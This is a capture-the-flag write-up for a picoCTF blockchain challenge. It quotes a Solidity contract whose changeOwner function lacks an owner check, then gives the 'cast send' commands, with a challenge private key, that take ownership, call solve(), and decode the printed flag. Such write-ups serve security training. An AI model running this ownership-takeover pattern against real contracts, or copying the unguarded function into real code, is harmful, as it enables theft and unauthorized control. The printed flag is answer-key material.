Access_Control

Category: Blockchain

Difficulty: Medium

Points: 200
________________________________________
Description
The challenge provides a smart contract that stores a secret flag. Only the contract owner can reveal the flag. The goal is to identify an access control vulnerability, take ownership of the contract, and retrieve the flag.
Source Code Analysis
After downloading the contract source, the following function stands out:
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
The function is declared as public and does not verify that the caller is the current owner.
A secure implementation would typically include:
require(msg.sender == owner, "Only owner can change ownership");
Because this check is missing, any user can assign ownership to themselves.
Exploitation Steps
1. Download the Contract
cd /tmp
wget https://challenge-files.picoctf.net/c_lonely_island/d721973ec2713063c60d9aff751b5e9c55c37de5982aa0c9bc34be6d9c8c5c0e/AccessControl.sol
cat AccessControl.sol
Reviewing the source reveals the vulnerable changeOwner() function.
2. Take Ownership
Call the vulnerable function and set the owner to our address:
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "changeOwner(address)" 0x264dfeEB59B07476d6063c71c4c6003c82E8d0ab --private-key 0x1184d29483798dabbdf89ee1877ab355ac3b356e7873b082be10545ed536b791 --rpc-url http://lonely-island.picoctf.net:51244 --legacy --gas-limit 200000
The transaction completed successfully with:
status 1 (success)
3. Reveal the Flag
Now that we are the owner, call the solve() function:
cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "solve()" --private-key 0x1184d29483798dabbdf89ee1877ab355ac3b356e7873b082be10545ed536b791 --rpc-url http://lonely-island.picoctf.net:51244 --legacy --gas-limit 200000
The transaction emitted the FlagRevealed event.
4. Extract the Flag
The event data contained:
7069636f4354467b695f63346e5f62335f30776e33725f39666236373437627d
Converting the hexadecimal string to ASCII gives:
picoCTF{i_c4n_b3_0wn3r_9fb6747b}
Vulnerability
The contract suffers from an Access Control Vulnerability because ownership can be changed by any user without authorization.
function changeOwner(address _newOwner) public {
    owner = _newOwner;
}
This allows an attacker to become the owner and access privileged functionality.
________________________________________

Flag : 
picoCTF{i_c4n_b3_0wn3r_9fb6747b}

________________________________________
